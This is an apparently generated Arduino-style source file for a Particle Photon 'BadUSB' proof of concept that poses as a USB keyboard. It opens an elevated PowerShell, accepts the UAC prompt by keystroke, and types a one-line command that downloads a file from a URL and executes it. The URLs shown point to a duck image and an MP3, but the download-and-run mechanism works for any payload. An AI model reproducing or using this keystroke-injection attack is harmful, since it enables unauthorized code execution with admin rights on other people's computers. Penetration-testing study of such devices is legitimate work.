/******************************************************/
//       THIS IS A GENERATED FILE - DO NOT EDIT       //
/******************************************************/

#include "Particle.h"
#line 1 "c:/Users/jmand/Documents/particle-photon-badusb/src/particle-photon-badusb.ino"
/*
 * Project particle-photon-badusb
 * Description: BadUSB penetration testing proof of concept for Photon board
 * Author:
 * Date:
 */

// EXAMPLE USAGE
// Use STARTUP() macro to avoid USB disconnect/reconnect (see begin() documentation)
void setup();
void loop();
#line 10 "c:/Users/jmand/Documents/particle-photon-badusb/src/particle-photon-badusb.ino"
STARTUP(Keyboard.begin());

void setup() {

  String url = "https://www.munchkin.com/media/catalog/product/3/1/31001_white_hot_safety_bath_ducky.jpg";
  String file = "31001_white_hot_safety_bath_ducky.jpg";
  String ride = "https://ia600209.us.archive.org/32/items/WagnerTheRideOfTheValkyries/WagnerTheRideOfTheValkyrieswww.keepvid.com.mp3";

  // WIN+R to open Run
  Keyboard.press(KEY_LEFT_WINDOWS);
  // Keyboard.press(114);
  Keyboard.press(KEY_R);
  Keyboard.releaseAll();
  delay(300);

  // Start PowerShell as admin
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  Keyboard.click(KEY_RETURN);

  // wait for startup (kinda slow)
  delay(2500);

  // confirm (2x TAB, RETURN) running PowerShell as admin
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_RETURN);
  Keyboard.press(KEY_LALT);
  // Keyboard.press(121);
  Keyboard.press(KEY_Y);
  Keyboard.releaseAll();
  delay(500);

  // Run PowerShell command: save file at $url as $file and execute it
  // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
  // Saves file to Users\$user filesystem root
  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
  delay(200);
  Keyboard.click(KEY_RETURN);

  // Keyboard.println("Hello world!");

  // // Type 'SHIFT+t', 'e', 's', 't', 'SPACE', '1', '2', '3', '.', '4', '0', 'ENTER'
  // Keyboard.printf("%s %.2f\n", "Test", 123.4f);

  // // Quickly press and release Ctrl-Alt-Delete
  // Keyboard.click(KEY_DELETE, MOD_LCTRL | MOD_LALT);

  // Press Ctrl, then Alt, then Delete and release them all
  // Keyboard.press(KEY_LCTRL);
  // Keyboard.press(KEY_LALT);
  // Keyboard.press(KEY_DELETE);
  // Keyboard.releaseAll();
}

void loop() {

}